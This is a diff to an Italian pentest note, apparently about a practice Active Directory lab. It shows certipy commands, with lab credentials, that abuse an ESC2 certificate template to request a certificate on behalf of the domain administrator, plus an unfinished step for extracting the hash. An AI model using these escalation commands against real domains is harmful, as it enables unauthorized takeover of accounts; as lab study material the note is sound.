@@ -234,12 +234,15 @@ Prendi il certificato usando certipy
 certipy-ad req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template ESC2 -ca ESSOS-CA
 ```
 ![[Pasted image 20230828150256.png]]
-Ora usa il certificato ottenuto per scaricare il certificato dell'amministrato
+Ora usa il certificato ottenuto per scaricare il certificato dell'amministratore
 ```bash
 certipy-ad req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template User -ca ESSOS-CA -on-behalf-of 'essos\administrator' -pfx khal.drogo.pfx
 ```
+![[Pasted image 20230828150815.png]]
+Ora usando il suo certificato prendi l'hash
+```bash
 
-
+```
 ### **ESC 3 - ADCS**
 ### **ESC 4 - ADCS**
 ### **ESC 6 - ADCS**
